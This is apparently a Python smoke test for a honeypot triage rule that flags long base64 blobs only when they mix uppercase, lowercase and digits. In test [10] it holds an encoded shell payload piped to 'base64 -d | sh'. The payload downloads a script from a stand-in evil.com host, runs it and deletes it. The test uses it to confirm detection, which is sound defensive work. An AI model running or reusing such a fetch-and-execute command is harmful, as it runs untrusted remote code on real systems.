"""Smoke test for ROADMAP #23: `base64_blob` triage now requires the
matched run to contain at least one ASCII upper, one ASCII lower, and one
digit — character-class entropy guard.

Pre-fix the rule was a pure length test: any string of `[A-Za-z0-9+/=]{40,}`
at or above `base64_min_run` (default 200 chars) tagged the command for
cloud escalation. That tagged long hex digests (lower+digits only), bare
uppercase ids (upper-only or upper+digits), or base32-shaped tokens as
"base64 blobs" — false positives that wasted cloud-escalation budget.

The fix adds `_has_mixed_classes(s)` which checks for at least one
character from each of {upper, lower, digit}. Only runs that pass this
check count toward the length test. Real base64 is essentially always
mixed-class (the encoding produces a near-uniform distribution over the
64-char alphabet, so on a 200-char run the probability of missing any
class is vanishingly small).

Standalone — no pytest, no ES.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_base64_classes.py
"""
from __future__ import annotations

import random
import string
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.config import CloudConfig
from enrich.triage import _has_mixed_classes, reasons_to_escalate
from enrich.llm.schemas import CommandEnrichment, IOCs


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if ok:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  {detail}")


cloud = CloudConfig()
THRESHOLD = cloud.triage.base64_min_run   # 200


def _enrichment() -> CommandEnrichment:
    """A confidence-7 enrichment so neither low_confidence nor local_failed
    fires. This isolates the base64_blob rule."""
    return CommandEnrichment(
        intent="execution",
        confidence=7,
        description="synthetic",
        iocs=IOCs(ips=[], domains=[], urls=[], hashes=[], files=[]),
    )


def fires(cmd: str) -> bool:
    """Returns True iff `base64_blob` is in the escalation reasons for `cmd`."""
    reasons = reasons_to_escalate(
        command=cmd,
        parsed=_enrichment(),
        local_failed=False,
        cfg=cloud,
        embedding=None,
        centroids=None,
        rng=random.Random(0),
    )
    return "base64_blob" in reasons


# -----------------------------------------------------------------------------
# [1] _has_mixed_classes unit tests.
# -----------------------------------------------------------------------------
print("\n[1] _has_mixed_classes")
check("Aa9 → True",       _has_mixed_classes("Aa9"), "")
check("aaa → False",      not _has_mixed_classes("aaa"), "")
check("AAA → False",      not _has_mixed_classes("AAA"), "")
check("999 → False",      not _has_mixed_classes("999"), "")
check("Aa → False (no digit)",  not _has_mixed_classes("Aa"), "")
check("A9 → False (no lower)",  not _has_mixed_classes("A9"), "")
check("a9 → False (no upper)",  not _has_mixed_classes("a9"), "")
check("'' → False",       not _has_mixed_classes(""), "")
# base64 padding / extras don't count toward any class.
check(
    "all '/' '+' '=' → False (these aren't in any class)",
    not _has_mixed_classes("+/=" * 50),
    "",
)
# Mixed within first few chars — early-exit path.
check(
    "Aa9 followed by lots of '+/=' → True (short-circuit early)",
    _has_mixed_classes("Aa9" + "+/=" * 100),
    "",
)


# -----------------------------------------------------------------------------
# [2] Real base64 fires. 200 chars of true mixed-class base64 is the
# canonical positive case.
# -----------------------------------------------------------------------------
print("\n[2] real base64 blob fires")
# Deterministic mixed base64 string. Build by picking from each class in turn.
def _make_b64(n: int, seed: int = 42) -> str:
    rng = random.Random(seed)
    alpha = string.ascii_letters + string.digits + "+/"
    # Force at least one of each class to be safe.
    out = ["A", "a", "0"] + [rng.choice(alpha) for _ in range(n - 3)]
    rng.shuffle(out)
    return "".join(out)

real_b64 = _make_b64(THRESHOLD)
check(
    f"{THRESHOLD}-char mixed base64 → base64_blob fires",
    fires(f"echo '{real_b64}' | base64 -d"),
    f"len={len(real_b64)} mixed={_has_mixed_classes(real_b64)}",
)


# -----------------------------------------------------------------------------
# [3] 200-char lowercase-hex digest does NOT fire (the main false positive).
# -----------------------------------------------------------------------------
print("\n[3] long lowercase-hex digest does NOT fire (was false positive)")
hex_digest = ("abcdef0123456789" * 13)[:THRESHOLD]  # 200 chars, no uppercase
assert len(hex_digest) == THRESHOLD
assert not any(c.isupper() for c in hex_digest)
check(
    f"{THRESHOLD}-char lowercase hex → base64_blob suppressed",
    not fires(f"sha256sum: {hex_digest}"),
    f"hex sample: {hex_digest[:40]}...",
)


# -----------------------------------------------------------------------------
# [4] Uppercase hex digest also rejected.
# -----------------------------------------------------------------------------
print("\n[4] long UPPERCASE hex digest does NOT fire")
hex_upper = ("ABCDEF0123456789" * 13)[:THRESHOLD]
check(
    f"{THRESHOLD}-char uppercase hex → base64_blob suppressed",
    not fires(f"hash: {hex_upper}"),
    f"hex sample: {hex_upper[:40]}...",
)


# -----------------------------------------------------------------------------
# [5] All-uppercase id (no digits) rejected.
# -----------------------------------------------------------------------------
print("\n[5] long all-uppercase identifier does NOT fire")
upper_id = "ABCDEFGHIJKLMNOP" * 13   # 208 chars, no digits, no lowercase
upper_id = upper_id[:THRESHOLD]
check(
    f"{THRESHOLD}-char all-upper → base64_blob suppressed",
    not fires(f"ID: {upper_id}"),
    f"sample: {upper_id[:40]}...",
)


# -----------------------------------------------------------------------------
# [6] All-lowercase id rejected.
# -----------------------------------------------------------------------------
print("\n[6] long all-lowercase identifier does NOT fire")
lower_id = "abcdefghijklmnop" * 13
lower_id = lower_id[:THRESHOLD]
check(
    f"{THRESHOLD}-char all-lower → base64_blob suppressed",
    not fires(f"ID: {lower_id}"),
    f"sample: {lower_id[:40]}...",
)


# -----------------------------------------------------------------------------
# [7] All-digit id rejected.
# -----------------------------------------------------------------------------
print("\n[7] long all-digit run does NOT fire")
all_digits = "0123456789" * 21   # 210 chars
all_digits = all_digits[:THRESHOLD]
check(
    f"{THRESHOLD}-char all-digit → base64_blob suppressed",
    not fires(f"value={all_digits}"),
    f"sample: {all_digits[:40]}...",
)


# -----------------------------------------------------------------------------
# [8] Sub-threshold base64 still doesn't fire (length gate intact).
# -----------------------------------------------------------------------------
print("\n[8] sub-threshold mixed base64 does NOT fire (length gate preserved)")
small = _make_b64(THRESHOLD - 10)
check(
    f"{len(small)}-char mixed base64 (< {THRESHOLD}) → not fired",
    not fires(f"echo {small}"),
    "",
)


# -----------------------------------------------------------------------------
# [9] Multiple base64-shaped runs in one command — longest valid wins.
# A short mixed run + a long hex run should NOT fire (longest valid is short).
# A short hex run + a long mixed run SHOULD fire.
# -----------------------------------------------------------------------------
print("\n[9] multi-run commands: longest *valid* match drives the decision")
short_mixed = _make_b64(50)
long_hex = ("abcdef0123" * 22)[:THRESHOLD]
check(
    "short mixed + long hex → NOT fire (long hex disqualified)",
    not fires(f"a={short_mixed} b={long_hex}"),
    f"short len={len(short_mixed)} hex len={len(long_hex)}",
)
short_hex = "abcdef0123" * 5  # 50 chars, no upper
long_mixed = _make_b64(THRESHOLD)
check(
    "short hex + long mixed → FIRES (long mixed is valid)",
    fires(f"a={short_hex} b={long_mixed}"),
    f"short hex len={len(short_hex)} mixed len={len(long_mixed)}",
)


# -----------------------------------------------------------------------------
# [10] Realistic attacker base64 from the corpus (mixed-class, > 200 chars)
# — sanity that the rule still catches what it's meant to.
# -----------------------------------------------------------------------------
print("\n[10] realistic attacker payload still flagged")
# Sample shape: encoded shell snippet. ~250 chars, clearly mixed.
realistic = (
    "echo aGVsbG8gd29ybGQ7IGNkIC90bXAvOyB3Z2V0IGh0dHA6Ly9hLmV2aWwuY29tL3BheWxv"
    "YWQuc2g7IGNobW9kICt4IHBheWxvYWQuc2g7IC4vcGF5bG9hZC5zaCAtLW5vLWxvZ2lubz0xICY7"
    "IHJtIC1mIHBheWxvYWQuc2g7IGV4ZWMgYmFzaCAtbA1234567890ABCabc"
    " | base64 -d | sh"
)
check(
    "realistic mixed-class base64 fires (length+mixed gates pass)",
    fires(realistic),
    f"len of inner ~{len(realistic)}",
)


# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
